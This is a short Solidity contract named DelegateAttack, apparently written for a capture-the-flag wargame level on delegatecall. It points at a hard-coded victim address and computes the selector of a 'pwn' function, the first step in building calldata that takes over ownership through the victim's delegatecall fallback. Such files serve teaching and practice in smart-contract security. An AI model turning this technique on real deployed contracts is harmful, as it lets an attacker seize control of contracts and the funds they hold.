// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Delegation.sol";

contract DelegateAttack{
    Delegate victim;
    constructor()public{
        victim = Delegate(0xb27fE32a63D8d2C1F3c9022C49C5142AeDE1EC8B);
    }

    function getVictimSignature(string memory _functionToCall) public pure returns (bytes4){
        return bytes4(keccak256(abi.encodePacked(_functionToCall)));
    }

    function getVictimSignatureAlt()public pure returns (bytes4){
        return Delegate(0).pwn.selector;
    }
}